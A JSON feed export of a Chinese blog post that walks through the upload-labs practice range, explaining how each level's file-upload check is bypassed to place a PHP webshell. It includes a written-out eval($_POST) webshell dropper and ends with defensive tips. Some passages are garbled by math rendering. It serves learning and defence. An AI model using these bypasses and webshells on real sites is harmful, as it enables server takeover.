{
    "version": "https://jsonfeed.org/version/1",
    "title": "小姜天堂",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2020/09/08/upload-labs/",
            "url": "http://example.com/2020/09/08/upload-labs/",
            "title": "upload-labs",
            "date_published": "2020-09-08T10:15:33.000Z",
            "content_html": "<p>文件上传</p>\n<p>漏洞成因： 具备上传文件功能的 Web 等应用，未对用户选择上传的文件进行校验，使得非法用户可通过上传可执行脚本而获取应用的控制权限。<br />\n防护与绕过： 通过 upload-labs 靶场，了解更多的防护与绕过手段。<br />\nupload-labs</p>\n<p>Pass-01（前端验证）</p>\n<ol>\n<li>\n<p>上传 php 一句话，弹窗提示。F12 发现表单提交时的 js 验证。</p>\n</li>\n<li>\n<p>类型不是.jpg|.png|.gif 时，验证失败，返回 false，直接修改表单处，相当于返回 true。<br />\n修改前：</p>\n</li>\n</ol>\n<p>修改后：</p>\n<ol start=\"3\">\n<li>上传成功，使用蚁剑连接。</li>\n</ol>\n<p>Pass-02（MIME 验证）<br />\n4.\t上传 php 一句话，网页加载（有发送请求）后，提示如下。</p>\n<ol start=\"5\">\n<li>\n<p>使用 BurpSuite 抓包，抓取上传图片的包和上传木马的包，比较后发现 Content-Type 的差别。</p>\n</li>\n<li>\n<p>修改上传木马包的 Content-Type 为 image/jpeg 后放包，上传成功，使用蚁剑连接。<br />\nPass-03（黑名单验证，特殊后缀）</p>\n</li>\n<li>\n<p>上传一句话，网页加载（有发送请求）后，提示如下，推测为黑名单验证。</p>\n</li>\n<li>\n<p>黑名单不全，可以使用大小写、‘.’号（如：1.php.）、特殊字符（如：1.php::$DATA）、Apache 文件后缀解析（1.php.xxx 为 1.php）等方式绕过，但查看源码后，发现都给过滤掉了。</p>\n</li>\n<li>\n<p>使用一些特殊的后缀。<br />\nphp：php3、php4、phtml<br />\njsp：jspx、jspf<br />\nasp：asa、cer<br />\n 使用特殊后缀之后，发现还是不行，返回结果为空，测试 &lt;?php phpinfo ();?&gt; 也读不出来。看 wp 和百度后，是由于环境是 phpstudy 搭建的，里面把后缀给限制了，所以改一下 httpd.conf 文件里的 #AddType application/x-httpd-php .php .phtml 为 AddType application/x-httpd-php .php .phtml .php3 .php4<br />\n 记得去掉 #号。<br />\n此处没有过滤.htaccess，可以先上传内容为：SetHandler application/x-httpd-php 的.htaccess 文件，含义：将所有文件解析为 php。然后上传个 jpg 格式的一句话也可以绕过了</p>\n</li>\n<li>\n<p>上传 1.php4，成功后查看图像地址，然后再使用蚁剑连接。</p>\n</li>\n</ol>\n<p>Pass-04（黑名单验证，.htaccess）<br />\n11.\t与 Pass-03 相似，还是黑名单，过滤得更多。<br />\n12.\t上传.htaccess 文件后，上传任意后缀包含一句话的马，连接上。<br />\nPass-05（黑名单验证，.user.ini.）<br />\n13.\t与前两关相似，再过滤了.htaccess，但是还有个 ini 配置文件可以利用。<br />\n14.\t先上传一个以 auto_prepend_file=1.gif 为内容的.user.ini 文件，然后再上传一个内容为 php 的一句话的脚本，命名为 1.gif，.user.ini 文件里的意思是：所有的 php 文件都自动包含 1.gif 文件。.user.ini 相当于一个用户自定义的 php.ini。<br />\n15.\t提示是：存在 readme.php 这个文件。</p>\n<ol start=\"16\">\n<li>复制图像地址后，将文件名改为 readme.php，然后密码设置为一句话的密码，蚁剑连接成功。<br />\n注：这里一开始我用的是 phpstudy 的 2016 版本，但是两个文件上传上去后 1.gif 还是没有给包含在 readme.php 里（使用蚁剑连接不上），然后后来换了个 v8.1 版本的，上传后可以成功连上。后来要手动配置 2016 版的 php 扩展设置，在选项那里输入 1.gif 后，给包含，但相当于服务端改了 php.ini 文件，利用方法不现实。为什么 2016 版的.user.ini 没有给 php.ini 扫描到呢？希望得到解决。</li>\n</ol>\n<p>Pass-06（黑名单验证，大小写绕过）<br />\n\t去除对文件后缀名的转为小写设定，直接选择后缀名为.Php 等非黑名单中存在的格式上传。<br />\nPass-07（黑名单验证，空格绕过）<br />\n\t去除了对文件后缀名的空格过滤，选择后缀为.php 的一句话上传，抓包后在后面增加空格，成功绕过。（空格不明显）</p>\n<p>Pass-08（黑名单验证，点号绕过）<br />\n\t去除了对文件后缀名的点号过滤，选择选择后缀为.php 的一句话上传，抓包后在后面增加点，成功绕过。</p>\n<p>Pass-09（黑名单验证，特殊字符::DATA绕过）\n\t去除了对字符串::DATA 的过滤，选择选择后缀为.php 的一句话上传，抓包后在后面增加::$DATA，上传成功。</p>\n<p>注：复制图像地址时，会附带::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>，要去掉后再连接，否则找不到文件。</mtext><mi>P</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>−</mo><mn>10</mn><mtext>（黑名单）</mtext><mn>17.</mn><mtext>查看源码后，发现其路径拼接的是</mtext></mrow><annotation encoding=\"application/x-tex\">DATA，要去掉后再连接，否则找不到文件。\nPass-10（黑名单）\n17.\t查看源码后，发现其路径拼接的是</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathdefault\">A</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">要</span><span class=\"mord cjk_fallback\">去</span><span class=\"mord cjk_fallback\">掉</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">再</span><span class=\"mord cjk_fallback\">连</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">否</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">找</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">到</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord cjk_fallback\">黑</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">单</span><span class=\"mord cjk_fallback\">）</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">.</span><span class=\"mord cjk_fallback\">查</span><span class=\"mord cjk_fallback\">看</span><span class=\"mord cjk_fallback\">源</span><span class=\"mord cjk_fallback\">码</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">发</span><span class=\"mord cjk_fallback\">现</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">路</span><span class=\"mord cjk_fallback\">径</span><span class=\"mord cjk_fallback\">拼</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">是</span></span></span></span> file_name 而不是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>e</mi></msub><mi>x</mi><mi>t</mi><mtext>，而</mtext></mrow><annotation encoding=\"application/x-tex\">file_ext，而</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\">e</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">t</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">而</span></span></span></span> file_name 只处理了文件名末尾的点。</p>\n<ol start=\"18\">\n<li>选择后缀为.php 的一句话上传，抓包后构造文件后缀为 php. .，成功绕过，再使用蚁剑连接。</li>\n</ol>\n<p>Pass-11（黑名单验证，双写绕过）<br />\n\t查看源码后，发现其对存在黑名单中的字符进行替换，但 str_ireplace () 函数只替换一次，因此修改文件名为 1.pphphp 后成功绕过。</p>\n<p>Pass-12（白名单验证，0x00 截断）<br />\n19.\t查看源码和提示，上传路径可控，并且是最终文件的存放位置是以拼接的方式，可以使用 %00 截断，但需要 php 版本 &lt; 5.3.4，并且 magic_quotes_gpc 关闭。原理是：php 的一些函数的底层是 C 语言，而 move_uploaded_file 就是其中之一，遇到 0x00 会截断，0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00。</p>\n<ol start=\"20\">\n<li>修改一句话的后缀名为.jpg 后上传，抓包后修改 URL，成功上传，复制图像地址后去掉 php 后的部分，然后用蚁剑连接。</li>\n</ol>\n<p>Pass-13（白名单验证，0x00 截断）<br />\n21.\t与 Pass-12 的区别是这里使用 POST 传地址，POST 不会对里面的数据自动解码，需要在 Hex 中修改。</p>\n<ol start=\"22\">\n<li>修改一句话的后缀名为.jpg 后上传，抓包后，修改路径处，增加 1.php，然后选择 Hex 后，找到增加的 1.php 位置，将 p 后的 0d（不同字符不同）修改为 00 后放包上传。同样复制图像地址后去掉 php 后的部分，然后用蚁剑连接。</li>\n</ol>\n<p>Pass-14（白名单验证，图片马）<br />\n23.\t上传图片马，查看源码后，意思是：读取上传文件的前两个字节内容，unpack 解码后，使用 intval 转换为 10 进制，默认为 10 进制，根据转换后的结果判断图片类型。</p>\n<ol start=\"24\">\n<li>制作图片马，copy 1.jpg/b + 1.jpg/a 2.jpg，2.jpg 就是生成的图片马。</li>\n<li>上传成功后，利用文件包含解析图片马里的 php 脚本，file 为我们的图片马位置。</li>\n</ol>\n<p>Pass-15（白名单验证，图片马）<br />\n\t与 Pass-14 相同，上传同个图片马就可以。相关函数说明：<br />\ngetimagesize(string filename [,array &imageinfo])// 获取图像信息，返回一个数组 /* 返回的数组中，索引 0：图像宽度像素值     索引 1：图像高度像素值     索引 2：图像类型，1=GIF，2=JPG，3=PNG，4=SWF，5=PSD，6=BMP，7=TIFF_II，8=TIFF_MM，9=JPC，10=JP2，11=JPX，12=JB2，13=SWC，14=IFF，15=WBMP，16=XBM，17=ICO，18=COUNT     索引 3：图像宽度和高度的字符串     索引 bits：图像的每种颜色的位数，二进制格式     索引 channels：图像的通道值     索引 mime：图像的 MIME 信息 <em>/image_type_to_extension (int $imagetype [,bool $include_dot = TRUE])// 获取图像类型的文件扩展名 /</em>include_dot 是否在扩展名前加点。默认为 TRUE */</p>\n<p>Pass-16（白名单验证，图片马）<br />\n\t与 Pass-14 相同，上传同个图片马就可以。相关函数说明：<br />\n此函数需要开启 php_exif 模块<br />\n exif_imagetype (string $filename)// 读取一个图像的第一个字节并检查其签名</p>\n<p>Pass-17（白名单验证，图片马 + 二次渲染）<br />\n26.\t验证过程：判断后缀与 MIME 类型是否符合要求，符合后生成新图像（内容不正确会失败，返回 false，相当于多了一次验证），生成新图像失败就 unlink 删除，成功就根据系统时间给文件命名，再通过 imagejpeg 类似函数使用原图像资源创建新图像（二次渲染）。相关函数说明：<br />\nbasename (string $path [,string $suffix]) // 返回路径中的文件名部分 imagecreatefromjpeg (string $filename) imagecreatefrompng (string $filename)  imagecreatefromgif (string $filename) // 由文件或 URL 创建一个新图像，内容不对则失败返回 false，成功后返回图像资源 srand ([int $seed ]) // 用 seed 播下随机数发生器种子 strval (mixed $var) // 返回字符串类型的 varimagejpeg (resource $image [,string $filename [,int $quality]])// 从 image 图像以 filename 为文件名创建一个 JPEG 图像 imagepng (resource $image [,string $filename]) // 从 image 图像以 filename 为文件名创建一个 PNG 图像或文件 imagegif (resource $image [,string $filename]) // 从 image 图像以 filename 为文件名创建一个 GIF 图像或文件</p>\n<ol start=\"27\">\n<li>绕过过程：这里用 gif，容易绕过二次渲染，上传图片马 2.gifcopy 1.gif/b + 1.php/a 2.gif，然后另存上传的图片马，使用查看被渲染后哪里保持不变，将一句话插入到不变的位置中去，保存图片马，再次上传，复制新上传的图像位置，使用蚁剑连接成功。</li>\n</ol>\n<p>Pass-18（白名单验证，条件竞争）<br />\n28.\t验证过程：服务器先将上传的文件保存在临时目录中，然后再对后缀名进行白名单验证，并重命名。<br />\nrename (string $oldname,string $newname [,resource $context])// 把 oldname 重命名为 newname</p>\n<ol start=\"29\">\n<li>绕过过程：不断上传文件，在文件还没被删除前去读取文件，若上传内容为 &lt;?php fputs (fopen ('2.php','w'),'&lt;?php @eval (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mi mathvariant=\"normal\">&quot;</mi><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">?</mo><msup><mo>&gt;</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">)</mo><mo separator=\"true\">;</mo><mo stretchy=\"false\">?</mo><mo>&gt;</mo><mtext>，则还没被删除前去读取文件，解析之后会写入一个内容为</mtext><mo>&lt;</mo><mo stretchy=\"false\">?</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant=\"normal\">@</mi><mi>e</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">_POST[&quot;pass&quot;])?&gt;&#x27;);?&gt;，则还没被删除前去读取文件，解析之后会写入一个内容为&lt;?php @eval(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">&quot;</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">s</span><span class=\"mord\">&quot;</span><span class=\"mclose\">]</span><span class=\"mclose\">)</span><span class=\"mclose\">?</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">&gt;</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mclose\">)</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mclose\">?</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">还</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">被</span><span class=\"mord cjk_fallback\">删</span><span class=\"mord cjk_fallback\">除</span><span class=\"mord cjk_fallback\">前</span><span class=\"mord cjk_fallback\">去</span><span class=\"mord cjk_fallback\">读</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">解</span><span class=\"mord cjk_fallback\">析</span><span class=\"mord cjk_fallback\">之</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">写</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">内</span><span class=\"mord cjk_fallback\">容</span><span class=\"mord cjk_fallback\">为</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mclose\">?</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">p</span><span class=\"mord\">@</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mopen\">(</span></span></span></span>_POST [&quot;pass&quot;])?&gt; 的 2.php 文件。使用 BurpSuite 的 Intruder 不断上传文件并不断访问所上传的文件。<br />\n注：&quot;pass&quot; 一定要双引号，不然单引号之间乱了。</li>\n<li>观察到有 200 的响应包，用蚁剑连接。2.php</li>\n</ol>\n<p>Pass-19（白名单验证，条件竞争）<br />\n31.\t验证过程：依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名。与 Pass-18 存在同样的条件竞争。不同的是这里先检查了后缀，所以要上传符合白名单里的才能进行。<br />\n32.\t任务是上传 webshell，但是不知道怎么做，可以通过之前的文件包含和 Pass-18 的条件竞争，上传一个图片马，然后不断访问，写入一个 webshell。<br />\n33.\t怎么才能直接上传 webshell？？？<br />\nPass-20（黑名单验证，点号绕过）<br />\n34.\t同样是上传路径可控，可以使用和 Pass-13 同样的方式绕过。不同的是这里的黑名单，可以文件名称保存的时候，加上.，最末的。号使得 pathinfo () 获取到的 PATHINFO_EXTENSION 为空，从而绕过黑名单。<br />\npathinfo (string $path [,int $options = PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME])  /* 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 options PATHINFO_DIRNAME：文件所在目录 PATHINFO_BASENAME：文件 + 后缀名 PATHINFO_EXTENSION：后缀名 PATHINFO_FILENAME：文件名 */</p>\n<ol start=\"35\">\n<li>上传，再用蚁剑连接。</li>\n</ol>\n<p>Pass-21（白名单验证，数组绕过）<br />\n36.\t验证过程：先检查 MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是 array 数组，不是的话就用 explode () 函数通过。号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。<br />\nexplode(string $delimiter , string $string [, int limit])//返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 reset(array &array)// 将数组的内部指针指向第一个单元<br />\n 37.\t绕过过程：绕过 MIMIE，改一下包的 Content-Type，为了绕过 explode () 函数，需要传入数组，绕过白名单，由于取的是 end () 也就是数组最后一个，需要传入数组的最后一个为 jpg|png|gif，最后是拼接文件名，取的是 reset () 第一个，即索引为 0，和索引 count ()-1（数组内元素个数 - 1）。所以令索引 0 为 1.php，索引 2 为 jpg（只要是索引 1 之后都可），这样数组元素个数为 2，拼接的就是索引 0 和索引 1，也就是 1.php 和空，结果还是 1.php，这样就可以使得拼接后的文件名为 1.php。如下：</p>\n<p>用到的部分函数说明<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>F</mi></msub><mi>I</mi><mi>L</mi><mi>E</mi><mi>S</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mtext>客户端上传的文件原名称，含扩展名</mtext></mrow><annotation encoding=\"application/x-tex\">_FILES[&#x27;file&#x27;][&#x27;name&#x27;] //客户端上传的文件原名称，含扩展名</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">F</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">m</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord cjk_fallback\">客</span><span class=\"mord cjk_fallback\">户</span><span class=\"mord cjk_fallback\">端</span><span class=\"mord cjk_fallback\">上</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">原</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">称</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">扩</span><span class=\"mord cjk_fallback\">展</span><span class=\"mord cjk_fallback\">名</span></span></span></span>_FILES ['file']['type'] // 上传的文件类型 $_FILES ['file']['tmp_name'] // 文件上传后，在服务器端存储的临时文件名 stripos (string $haystack,string $needle [,int $offset = 0])// 查找字符串首次出现的位置（不区分大小写）strrpos (string $haystack,string $needle [,int $offset = 0])// 计算指定字符串在目标字符串中最后一次出现的位置 move_uploaded_file (string $filename,string $destination) // 文件上传后先存储于服务器的临时目录中，使用该函数移动文件位置 substr (string $string,int $start [,int $length]) // 返回字符串 string 中从位置 start 处后的长度为 length 部分 strrchr (string $haystack,mixed $needle) // 返回 haystack 字符串中的一部分，这部分以 needle 的最后出现位置开始，直到 haystack 末尾 in_array (mixed $needle,array $haystack [,bool $strict = FALSE])// 在数组 haystack 中搜索是否存在值 needle，strict 若设置 TRUE，则类型也会匹配</p>\n<p>总结<br />\n防御<br />\n 38.\t黑白名单；<br />\n39.\t对上传的文件重命名，不易被猜测；<br />\n40.\t对上传的内容进行读取检查；<br />\n41.\t不要暴露上传文件的位置；<br />\n42.\t禁用上传文件的执行权限；<br />\n不同系统有不同的需求，根据系统需求制定特定的防御手段。</p>\n",
            "tags": []
        }
    ]
}